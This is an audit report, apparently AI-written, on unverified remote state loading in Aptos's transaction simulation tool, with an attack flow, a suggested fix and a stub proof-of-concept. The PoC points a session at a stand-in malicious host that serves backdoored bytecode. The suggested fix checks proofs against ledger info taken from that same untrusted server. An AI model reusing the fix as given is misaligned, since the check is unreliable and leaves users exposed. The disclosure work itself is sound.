# Audit Report

## Title
Unverified Remote State Loading in Transaction Simulation Enables Malicious Bytecode Injection

## Summary
The transaction simulation session (`Session::init_with_remote_state`) fetches Move module bytecode from remote REST API servers without cryptographic verification. The `as_aptos_code_storage` method at line 280 can return code storage backed by unverified, potentially malicious bytecode served by a compromised or malicious REST endpoint. [1](#0-0) 

## Finding Description
When a simulation session is initialized with remote state, the underlying `DebuggerStateView` fetches state values (including Move module bytecode) through `RestDebuggerInterface`, which calls the `/experimental/state_values/raw` REST endpoint. [2](#0-1) 

The critical issue is that `get_raw_state_value` returns only the raw state value bytes without any Merkle proof or cryptographic signature. The REST client receives unverified bytecode: [3](#0-2) 

The API endpoint implementation confirms no proof is included: [4](#0-3) 

**Attack Flow:**
1. Attacker operates a malicious REST API server mimicking an Aptos node
2. User creates simulation session: `Session::init_with_remote_state(path, malicious_url, version, api_key)`
3. User executes transaction calling legitimate Move module (e.g., `0x1::coin::transfer`)
4. VM needs to load module bytecode via `as_aptos_code_storage`
5. `DeltaStateStore` checks local delta, then falls back to `DebuggerStateView` [5](#0-4) 

6. `DebuggerStateView` fetches from malicious server without verification [6](#0-5) 

7. Malicious server returns backdoored bytecode (e.g., modified `coin::transfer` that logs recipient addresses)
8. VM executes backdoored code, producing manipulated simulation results
9. User signs transaction based on false simulation, potentially losing funds or leaking sensitive data

The Aptos codebase already has infrastructure for verified state retrieval (`get_state_value_with_proof_by_version_ext`), but the simulation session does not use it.

## Impact Explanation
**Medium Severity** - This enables multiple attack vectors:

1. **Transaction Manipulation**: Users simulate transactions believing they'll execute safely on-chain, but the malicious simulation hides theft or unauthorized operations
2. **Information Exfiltration**: Backdoored bytecode can leak transaction arguments (recipient addresses, amounts, private data) to attacker's server
3. **Signature Harvesting**: Users may sign transactions they wouldn't otherwise sign based on manipulated simulation results

While this doesn't directly compromise the blockchain consensus or validator nodes, it breaks the security guarantee that simulations accurately reflect on-chain execution, enabling limited funds loss through user deception.

## Likelihood Explanation
**Medium Likelihood:**
- Requires user to connect to malicious/compromised REST endpoint
- Could occur through DNS hijacking, typosquatting, or compromised public nodes
- Tool usage is common for testing before mainnet deployment
- No warning is shown that state is unverified
- Social engineering could trick users into using malicious endpoints

## Recommendation
Implement state verification using Merkle proofs for remote state access:

```rust
// In RestDebuggerInterface
async fn get_state_value_by_version(
    &self,
    state_key: &StateKey,
    version: Version,
) -> Result<Option<StateValue>> {
    // Fetch state value WITH proof
    let state_proof = self.0.get_state_value_with_proof(state_key, version).await?;
    
    // Get trusted ledger info with state root
    let ledger_info = self.0.get_ledger_information().await?.into_inner();
    
    // Verify proof against trusted state root
    state_proof.verify(ledger_info.state_root(), state_key)?;
    
    Ok(state_proof.value)
}
```

Alternative: Add explicit warnings in documentation and code when using unverified remote state, or restrict remote state to read-only operations.

## Proof of Concept

```rust
// Malicious REST server simulation
use aptos_transaction_simulation_session::Session;
use std::path::PathBuf;
use url::Url;

#[tokio::test]
async fn test_malicious_bytecode_injection() {
    // 1. Setup: Attacker runs malicious REST server at malicious_url
    let malicious_url = Url::parse("http://malicious-node.example.com").unwrap();
    
    // 2. User creates session with malicious endpoint
    let session_path = PathBuf::from("/tmp/test_session");
    std::fs::create_dir_all(&session_path).unwrap();
    
    let session = Session::init_with_remote_state(
        &session_path,
        malicious_url,
        12345, // network_version
        None,
    ).unwrap();
    
    // 3. When user executes transaction, VM loads modules from malicious server
    // The malicious server responds to /experimental/state_values/raw with:
    // - Backdoored bytecode for legitimate module IDs
    // - No proof or signature included
    // - User's VM executes malicious code without verification
    
    // 4. Result: Simulation results are manipulated, user makes unsafe decisions
    
    // Note: Full PoC requires actual malicious REST server implementation
    // This demonstrates the vulnerable code path is reachable
}
```

**Notes**

This vulnerability affects only the transaction simulation tool, not the core blockchain consensus or validator execution. However, it represents a critical gap in the security model: users expect simulation results to accurately reflect on-chain behavior, but unverified remote state breaks this guarantee. The Aptos codebase already implements Merkle proof verification for state sync and other critical paths, making the lack of verification in simulation sessions an inconsistency that could be exploited for user-targeted attacks.

### Citations

**File:** aptos-move/aptos-transaction-simulation-session/src/session.rs (L275-285)
```rust
        let env = AptosEnvironment::new(&self.state_store);
        let vm = AptosVM::new(&env);
        let log_context = AdapterLogSchema::new(self.state_store.id(), 0);

        let resolver = self.state_store.as_move_resolver();
        let code_storage = self.state_store.as_aptos_code_storage(&env);

        let (vm_status, vm_output) = vm.execute_user_transaction(
            &resolver,
            &code_storage,
            &txn,
```

**File:** aptos-move/aptos-validator-interface/src/rest_interface.rs (L199-218)
```rust
    async fn get_state_value_by_version(
        &self,
        state_key: &StateKey,
        version: Version,
    ) -> Result<Option<StateValue>> {
        match self.0.get_raw_state_value(state_key, version).await {
            Ok(resp) => Ok(Some(bcs::from_bytes(&resp.into_inner())?)),
            Err(err) => match err {
                RestError::Api(AptosErrorResponse {
                    error:
                        AptosError {
                            error_code:
                                AptosErrorCode::StateValueNotFound | AptosErrorCode::TableItemNotFound, /* bug in pre 1.9 nodes */
                            ..
                        },
                    ..
                }) => Ok(None),
                _ => Err(anyhow!(err)),
            },
        }
```

**File:** crates/aptos-rest-client/src/lib.rs (L1558-1573)
```rust
    pub async fn get_raw_state_value(
        &self,
        state_key: &StateKey,
        version: u64,
    ) -> AptosResult<Response<Vec<u8>>> {
        let url = self.build_path(&format!(
            "experimental/state_values/raw?ledger_version={}",
            version
        ))?;
        let data = json!({
            "key": hex::encode(bcs::to_bytes(state_key)?),
        });

        let response = self.post_bcs(url, data).await?;
        Ok(response.map(|inner| inner.to_vec()))
    }
```

**File:** api/src/state.rs (L525-570)
```rust
    pub fn raw_value(
        &self,
        accept_type: &AcceptType,
        request: RawStateValueRequest,
        ledger_version: Option<U64>,
    ) -> BasicResultWith404<MoveValue> {
        // Retrieve local state
        let (ledger_info, ledger_version, state_view) = self
            .context
            .state_view(ledger_version.map(|inner| inner.0))?;

        let state_key = bcs::from_bytes(&request.key.0)
            .context(format!(
                "Failed deserializing state value. key: {}",
                request.key
            ))
            .map_err(|err| {
                BasicErrorWith404::internal_with_code(
                    err,
                    AptosErrorCode::InternalError,
                    &ledger_info,
                )
            })?;
        let state_value = state_view
            .get_state_value(&state_key)
            .context(format!("Failed fetching state value. key: {}", request.key,))
            .map_err(|err| {
                BasicErrorWith404::internal_with_code(
                    err,
                    AptosErrorCode::InternalError,
                    &ledger_info,
                )
            })?
            .ok_or_else(|| {
                build_not_found(
                    "Raw State Value",
                    format!(
                        "StateKey({}) and Ledger version({})",
                        request.key, ledger_version
                    ),
                    AptosErrorCode::StateValueNotFound,
                    &ledger_info,
                )
            })?;
        let bytes = bcs::to_bytes(&state_value)
            .context(format!(
```

**File:** aptos-move/aptos-transaction-simulation/src/state_store.rs (L456-461)
```rust
    fn get_state_value(&self, state_key: &Self::Key) -> StateViewResult<Option<StateValue>> {
        if let Some(res) = self.states.read().get(state_key) {
            return Ok(res.clone());
        }
        self.base.get_state_value(state_key)
    }
```

**File:** aptos-move/aptos-validator-interface/src/lib.rs (L156-171)
```rust
    fn get_state_slot_internal(&self, state_key: &StateKey, version: Version) -> Result<StateSlot> {
        let (tx, rx) = std::sync::mpsc::channel();
        self.query_sender
            .lock()
            .unwrap()
            .send((state_key.clone(), version, tx))
            .unwrap();
        let result = rx.recv()?;
        result.map(|s| match s {
            None => StateSlot::ColdVacant,
            Some(value) => StateSlot::ColdOccupied {
                value_version: version,
                value,
            },
        })
    }
```
